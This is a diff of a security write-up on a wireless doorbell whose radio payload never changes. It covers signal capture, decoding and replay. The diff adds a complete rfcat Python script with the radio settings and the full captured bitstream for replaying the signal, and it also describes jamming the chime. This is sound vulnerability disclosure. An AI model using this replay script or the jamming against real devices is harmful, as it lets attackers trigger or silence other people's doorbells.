@@ -16,6 +16,7 @@ The control and data planes for network communication suffered from severe crypt
 
 Here is a technical breakdown of how I captured, reverse-engineered, and successfully replayed the signal/payload:  
 
+
 ## Signal Capture & Observation
 
 The first thing I needed to do was capture the raw RF transmissions generated when the doorbell button is physically pressed. I connected an RTL-SDR Blog v4 to SDR# and isolated the bandwidth to the targeted operating frequencies. I took the easy road next by looking up the device’s data sheet to find the operating frequencies instead of manually searching the spectrum while continually pressing the trigger button. Doing so resulted in discovering that the doorbell transmits the same payload across both the 433 MHz and 868 MHz bands simultaneously. The developers likely implemented this dual-band approach to guarantee signal delivery. By broadcasting simultaneously, the device maximizes its ability to penetrate physical barriers and mitigate effects from local interference.
@@ -37,21 +38,53 @@ By decoding the waveform, I was able to map out the complete packet anatomy: the
 <img width="977" height="438" alt="image" src="https://github.com/user-attachments/assets/9f4242b6-add2-4c2f-95fb-abe999b827f5" />
 Detailed look into the static payload across 5 transmissions using URH showcasing the complete lack of variance across multiple triggers.
 
+
 ## Exploiting the Replay Attack and Signal Jamming
 
-With the packet anatomy and technical signal transmission parameters identified, I moved to exploit the static payload using a Yard Stick One software-controlled transceiver.
-
-Using this script written around `rfcat`, I configured the Yard Stick One to match the targeted environment parameters:
+With the packet anatomy and technical signal transmission parameters identified, I moved to exploit the static payload using a Yard Stick One software-controlled transceiver. Using the `rfcat` library, I dropped into an interactive python shell to configure the Yard Stick One to use the targeted environment parameters (listed below) and transmit the captured payload.
 
 - **Frequencies:** 433 MHz and 868 MHz
 - **Modulation:** Amplitude Shift Keying (ASK / OOK)
 - **Line Encoding:** Pulse Width Modulation (PWM)
 - **Symbol Time:** 1 ms
-- **Symbol (Baud) Rate:** 1000 Baud ($1 / 0.001\text{ s}$)
+- **Symbol (Baud) Rate:** 1000 Baud (1 / 0.001)
 
+`
+from rflib import *
 
+d = RfCat()
+d.setFreq(433000000)
+d.setMdmModulation(MOD_ASK_OOK)
+d.setMdmDRate(1000)
+d.setMdmSyncMode(0)
+d.setMdmNumPreamble(0)
 
-By passing the previously captured packet structure into `rfcat`, I successfully crafted and transmitted a synthetic signal that perfectly replicated the doorbell's original transmission. The indoor chime activated immediately. Because the receiver does not track state or validate signal freshness, it blindly accepted the replayed payload as a legitimate, authenticated button press.
+data = (
+    "11000100011101110100010001000111010001000111011101000100010001110"
+    "1000100011101110100010001000111010001000111011101000111011101000"
+    "1000100011101110100010001000111010001000111011101000100010001000"
+    "1000100011101110100010001110100010001000111011101000111010001000"
+    "1000100011101110100010001110111010001110111010001110111011101000"
+    "1000100010001110100010001000100010001000100011101000100010001110"
+    "1000100010001000100010001000111010001110100010001110100011101110"
+    "1000100010001000100010001000111010001000100010001000100010001"
+)
+
+transmission = data * 5
+
+padding = len(transmission) % 8
+if padding != 0:
+    transmission += "0" * (8 - padding)
+
+# string to bytes
+payload = int(transmission, 2).to_bytes(len(transmission) // 8, byteorder='big')
+
+d.makePktFLEN(len(payload))
+d.RFxmit(payload)
+d.setModeIDLE()
+`
+
+I successfully crafted and transmitted a synthetic signal that perfectly replicated the doorbell's original transmission. Because the receiver does not track state or validate signal freshness, it accepted the replayed payload as a legitimate and authenticated button press.
 
   
 ## Impact & Threat Model
@@ -60,6 +93,7 @@ By exploiting this lack of signal variance, an attacker can completely compromis
 
 - **Unauthorized Initiation:** Replaying the static payload allows an attacker to trigger the chime repeatedly at any time, causing a nuisance or creating false alerts inside the home.
 - **Denial of Service (Jamming):** By continuously transmitting a continuous carrier wave or flooding the 433/868 MHz operational frequencies with the static payload, an attacker can completely deafen the chime receiver. This prevents legitimate doorbell presses from triggering the chime, effectively masking the arrival of visitors or malicious actors.
+
 
 ## Conclusion & Mitigations
 
